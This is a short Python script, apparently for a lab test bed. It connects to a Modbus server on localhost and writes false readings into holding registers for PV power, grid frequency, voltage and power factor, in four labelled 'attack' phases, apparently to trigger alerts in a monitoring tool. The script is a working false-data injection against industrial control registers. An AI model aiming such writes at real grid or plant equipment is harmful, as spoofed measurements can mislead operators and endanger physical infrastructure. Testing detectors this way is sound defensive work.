import time
from pymodbus.client.sync import ModbusTcpClient

HOST, PORT, UNIT = "127.0.0.1", 5020, 1

def wreg(client, addr, val):
    rr = client.write_register(address=addr, value=val, unit=UNIT)
    return not rr.isError()

def main():
    c = ModbusTcpClient(HOST, port=PORT)
    assert c.connect(), "cannot connect to modbus server"

    print("🔴 Attack start: spoofing holding registers...")

    # Addresses (0-based): see publisher map
    # 0: V1_V (x1), 1: V1_pu (x1000), 2: f_Hz (x100), 3: P_PV_kW (x10), 4: Q_PV_kVAR (x10)
    # 5: P_Source_kW (x10), 6: Q_Source_kVAR (x10), 7: pf_src (x1000), 8: pf_pv (x1000)

    # Phase 1: sudden huge PV power jump → ramp violation
    wreg(c, 3, 5000)     # P_PV = 500.0 kW (way above nameplate)
    wreg(c, 5, 9000)     # P_Source = 900.0 kW
    time.sleep(2)

    # Phase 2: frequency out-of-range
    wreg(c, 2, 5650)     # f_Hz = 56.50 (nonsense on a 60 Hz feeder)
    time.sleep(2)

    # Phase 3: voltage out-of-range
    wreg(c, 1, 1200)     # V1_pu = 1.200 (20% high)
    time.sleep(2)

    # Phase 4: pf anomalies
    wreg(c, 7, 0)        # pf_src = 0.000 (unrealistic for long)
    wreg(c, 8, 0)        # pf_pv  = 0.000

    print("🔴 Attack complete. Values written. Monitor should show alerts.")
    c.close()

if __name__ == "__main__":
    main()
